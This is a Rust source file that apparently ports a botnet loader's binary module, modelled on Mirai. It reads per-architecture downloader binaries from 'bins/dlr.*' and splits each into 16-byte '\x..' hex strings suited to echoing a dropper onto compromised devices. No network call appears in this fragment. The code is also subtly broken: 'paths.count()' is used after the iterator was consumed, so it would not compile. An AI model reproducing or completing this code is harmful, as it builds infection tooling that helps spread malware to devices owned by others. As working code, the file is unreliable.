use glob::glob;
use std::fs::File;
use std::io::{self, BufReader, Read};
use std::path::Path;
use std::ffi::OsStr;

const BINARY_BYTES_PER_ECHOLINE: usize = 16;

#[derive(Debug)]
struct Binary {
    arch: String,
    hex_payloads: Vec<String>,
}

static mut BIN_LIST: Vec<Binary> = Vec::new();

fn binary_init() -> bool {
    match glob("bins/dlr.*") {
        Ok(paths) => {
            for (i, entry) in paths.enumerate() {
                match entry {
                    Ok(path) => {
                        if let Some(file_name) = path.file_name().and_then(OsStr::to_str) {
                            let mut bin = Binary {
                                arch: String::new(),
                                hex_payloads: Vec::new(),
                            };

                            if let Some(ext) = Path::new(file_name).extension().and_then(OsStr::to_str) {
                                bin.arch = ext.to_string();
                            }

                            if load(&mut bin, &path) {
                                unsafe {
                                    BIN_LIST.push(bin);
                                }
                            }

                            #[cfg(debug_assertions)]
                            println!("({}/{}) {} is loading...", i + 1, paths.count(), file_name);
                        }
                    }
                    Err(e) => println!("Error reading glob entry: {:?}", e),
                }
            }
        }
        Err(e) => {
            println!("Failed to load from bins folder! Error: {:?}", e);
            return false;
        }
    }
    true
}

fn binary_get_by_arch(arch: &str) -> Option<&'static Binary> {
    unsafe {
        for bin in &BIN_LIST {
            if bin.arch == arch {
                return Some(bin);
            }
        }
    }
    None
}

fn load(bin: &mut Binary, fname: &Path) -> bool {
    let file = match File::open(fname) {
        Ok(file) => file,
        Err(e) => {
            println!("Failed to open {} for parsing, error: {:?}", fname.display(), e);
            return false;
        }
    };

    let mut reader = BufReader::new(file);
    let mut rdbuf = [0u8; BINARY_BYTES_PER_ECHOLINE];

    while let Ok(n) = reader.read(&mut rdbuf) {
        if n == 0 {
            break;
        }

        let mut payload = String::new();
        for byte in &rdbuf[..n] {
            payload.push_str(&format!("\\x{:02x}", byte));
        }

        bin.hex_payloads.push(payload);
    }

    true
}

fn main() {
    if binary_init() {
        println!("Binary initialization successful");
    } else {
        println!("Binary initialization failed");
    }

    if let Some(bin) = binary_get_by_arch("x86") {
        println!("Found binary for architecture x86: {:?}", bin);
    } else {
        println!("No binary found for architecture x86");
    }
}
